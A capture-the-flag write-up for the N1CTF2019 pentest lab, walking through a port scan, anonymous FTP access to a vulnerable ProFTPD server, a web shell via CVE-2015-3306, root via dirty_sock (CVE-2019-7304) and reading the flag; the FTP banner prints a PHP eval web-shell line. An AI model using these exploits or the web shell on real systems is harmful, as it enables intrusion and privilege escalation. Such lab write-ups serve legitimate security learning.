# Pentest N1ctf2019.lab(step1)

```
Pentest N1ctf2019.lab,But there is no need to scanning the web path. This will cause your IP to be banned.
http://47.52.129.242

Hint for Pentest N1ctf2019.lab step1(Web):flag is in host:web.n1ctf2019.lab path:/root/flag.txt
Hint for Pentest N1ctf2019.lab step1(Web):https://wiki.archlinux.org/index.php/Snap
Hint for Pentest N1ctf2019.lab step1(Web):FTP supports two modes: active and passive.
```

## Step 1 - Port Scanning

I can't found any pages on web service.  
I did a port scan and found other services.

```
Starting Nmap 7.30 ( https://nmap.org )
Nmap scan report for 47.52.129.242
Host is up (0.081s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
```

## Step 2 - access FTP Service & ProFTPd 1.3.5 (CVE-2015-3306)

```bash
root@vultr:~# ftp 47.52.129.242
Connected to 47.52.129.242.
220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:10.0.0.85]
Name (47.52.129.242:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230-Welcome to N1ctf2019.lab!
230-
230-<?=eval($_REQUEST["enjoy~"]);?>
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      nogroup        60 Sep  8 12:42 23333.php
-rw-r--r--   1 ftp      nogroup        60 Sep  8 11:10 fxxky0u.php
-rw-r--r--   1 root     root           26 Sep  7 07:47 index.html
-rw-r--r--   1 ftp      nogroup        60 Sep  8 15:11 mads.php
-rw-r--r--   1 ftp      nogroup        60 Sep  8 12:18 qiyou.php
-rw-r--r--   1 ftp      nogroup        60 Sep  8 12:43 test.php
-rw-r--r--   1 root     root           60 Sep  7 07:47 W3lc0m3_T0_N1ctf.msg
226 Transfer complete
ftp> 
```

Ftp service can access using anonymous account.
and `ProFTPD 1.3.5rc3` is vulnerable version about `CVE 2015-3306`.

https://github.com/t0kx/exploit-CVE-2015-3306  
https://www.exploit-db.com/exploits/36742

now, I can get webshell.

## Step 3 - LPE with dirty_sock (CVE-2019-7304)

https://github.com/initstring/dirty_sock

Finally, I can get `root`.

## Step 4 - get FLAG


```bash
$ ssh dirty_sock@47.52.129.242  
dirty_sock@47.52.129.242's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-93-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
New release '16.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Welcome to N1CTF2019!

dirty_sock@web:~$ sudo -i
[sudo] password for dirty_sock: 
root@web:~# cat ~/flag.txt 
N1CTF{ImpOrtant_P0int3_4de0e}
root@web:~# 

```


